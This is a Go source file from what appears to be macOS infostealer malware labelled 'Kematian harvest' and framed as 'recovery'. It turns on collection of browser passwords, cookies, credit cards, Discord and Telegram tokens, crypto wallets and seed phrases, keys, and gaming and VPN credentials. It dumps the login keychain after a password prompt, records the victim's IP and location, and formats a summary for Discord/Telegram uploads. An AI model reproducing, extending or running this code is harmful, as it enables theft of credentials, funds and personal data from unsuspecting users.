// collect.go — orchestrates a full local harvest into harvestPayload.
//
// runHarvest is the only entry used by main: it enables every collect category,
// overlaps wallet-extension scanning with Collect, then derives seeds / password
// candidates and public geo metadata for the upload summary.
package main

import (
	"runtime"
	"sync"

	"recovery/recovery"
)

// harvestPayload is the in-memory harvest used for zip export and upload captions.
// Seeds / KeychainDump are kept separate from Result (derived / large binary-ish text).
type harvestPayload struct {
	Hostname    string                     `json:"hostname"`
	OS          string                     `json:"os"`
	Arch        string                     `json:"arch"`
	PublicIP    string                     `json:"publicIp,omitempty"`
	Country     string                     `json:"country,omitempty"`
	CountryCode string                     `json:"countryCode,omitempty"`
	City        string                     `json:"city,omitempty"`
	MacUser     string                     `json:"macUser,omitempty"`
	Result      *recovery.CollectionResult `json:"result"`
	Seeds       []recovery.SeedResult      `json:"seeds,omitempty"`
	// KeychainDump is security dump-keychain -d text; exported to primary zip only (not harvest.json).
	KeychainDump []byte `json:"-"`
}

// fullCollectOptions turns on every recovery category for a standalone Mac run.
func fullCollectOptions() recovery.CollectOptions {
	opts := recovery.CollectOptions{Browsers: true}
	opts.Passwords = true
	opts.Cookies = true
	opts.Autofill = true
	opts.History = true
	opts.Bookmarks = true
	opts.CreditCards = true
	opts.Discord = true
	opts.Files = true
	opts.Wallets = true
	opts.Keys = true
	opts.Telegram = true
	opts.Apps = true
	opts.Gaming = true
	opts.VPNs = true
	return opts
}

// runHarvest collects all categories, enriches with seeds/candidates/geo, and
// returns a payload ready for export + upload. Extension scan runs in parallel
// with Collect because it does not depend on browser decryption keys.
func runHarvest(hostname string) (*harvestPayload, error) {
	opts := fullCollectOptions()

	// Wallet browser extensions (LevelDB paths) are independent of Chromium key resolution.
	var extensions []recovery.ExtensionResult
	var extWg sync.WaitGroup
	extWg.Add(1)
	go func() {
		defer extWg.Done()
		extensions = recovery.ScanExtensions()
	}()

	result, err := recovery.Collect(opts, nil)
	if err != nil {
		return nil, err
	}

	extWg.Wait()
	result.Extensions = extensions

	// Post-processing: BIP39-like phrases + login keychain dump + password candidates.
	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)

	// Keychain must already be unlocked (main → EnsureLoginKeychainUnlocked with modal password).
	// Harvest dump for primary upload (logs/keys/keychain_dump.txt) and parse candidates.
	keychainDump, keychainCandidates := recovery.HarvestLoginKeychain()
	result.PasswordCandidates = recovery.BuildPasswordCandidates(result.Passwords, result.Autofill, keychainCandidates)
	if mp := recovery.MacLoginPassword(); mp != "" {
		result.PasswordCandidates = appendMacLoginCandidate(result.PasswordCandidates, mp)
	}
	result.PasswordCandidates = recovery.AppendExtraPasswordCandidates(result.PasswordCandidates, result)

	publicIP, country, countryCode, city, macUser := collectVictimInfo()

	return &harvestPayload{
		Hostname:     hostname,
		OS:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		PublicIP:     publicIP,
		Country:      country,
		CountryCode:  countryCode,
		City:         city,
		MacUser:      macUser,
		Result:       result,
		Seeds:        seeds,
		KeychainDump: keychainDump,
	}, nil
}

// harvestSummary is the multi-line caption embedded in Discord/Telegram uploads
// and written to summary.txt inside each harvest zip.
func harvestSummary(p *harvestPayload) string {
	if p == nil || p.Result == nil {
		return "Harvest complete (empty)"
	}
	r := p.Result
	summary := formatSummary(
		p.Hostname, p.OS, p.Arch, p.PublicIP, p.CountryCode, p.Country, p.MacUser,
		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
		countDesktopWallets(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
		countGaming(r.Gaming), countVPNs(r.VPNs), len(r.PasswordCandidates), len(p.Seeds),
	)
	if len(p.KeychainDump) > 0 {
		summary += "\nkeychain dump: " + itoa(len(p.KeychainDump)) + " bytes"
	}
	return summary
}

func countDesktopWallets(wallets []recovery.WalletResult) int {
	n := 0
	for _, w := range wallets {
		if w.Type == "desktop" {
			n++
		}
	}
	return n
}

func countGaming(g *recovery.GamingResult) int {
	if g == nil {
		return 0
	}
	n := 0
	if g.Steam != nil {
		n++
	}
	n += len(g.BattleNet) + len(g.Epic) + len(g.Riot) + len(g.Uplay)
	return n
}

func countVPNs(v *recovery.VPNResult) int {
	if v == nil {
		return 0
	}
	return len(v.NordVPN) + len(v.WireGuard) + len(v.OpenVPN) + len(v.Mullvad)
}

func formatSummary(host, osName, arch, publicIP, countryCode, country, macUser string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, tg, apps, gaming, vpns, candidates, seeds int) string {
	identity := "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n"
	if publicIP != "" || macUser != "" || countryCode != "" {
		identity += "ip: " + fallback(publicIP, "unknown")
		if countryCode != "" {
			identity += " | country: " + countryCode
			if country != "" && country != countryCode {
				identity += " (" + country + ")"
			}
		}
		if macUser != "" {
			identity += " | user: " + macUser
		}
		identity += "\n"
	}
	return identity +
		"passwords: " + itoa(pw) + " | cookies: " + itoa(ck) + " | autofill: " + itoa(af) + "\n" +
		"history: " + itoa(hi) + " | bookmarks: " + itoa(bk) + " | cards: " + itoa(cc) + "\n" +
		"discord: " + itoa(dt) + " | wallet extensions: " + itoa(ex) + " | desktop wallets: " + itoa(wl) + "\n" +
		"keys: " + itoa(keys) + " | telegram: " + itoa(tg) + " | apps: " + itoa(apps) + "\n" +
		"gaming: " + itoa(gaming) + " | vpns: " + itoa(vpns) + " | pw candidates: " + itoa(candidates) + " | seeds: " + itoa(seeds)
}

// appendMacLoginCandidate ensures the validated Mac login password is in the wordlist once.
func appendMacLoginCandidate(candidates []recovery.PasswordCandidateResult, password string) []recovery.PasswordCandidateResult {
	seen := make(map[string]bool, len(candidates))
	for _, c := range candidates {
		seen[c.Password] = true
	}
	if !seen[password] {
		candidates = append(candidates, recovery.PasswordCandidateResult{
			Password: password,
			Source:   "mac_login",
			Detail:   "macOS user password",
		})
	}
	return candidates
}

func fallback(value, def string) string {
	if value != "" {
		return value
	}
	return def
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var buf [20]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}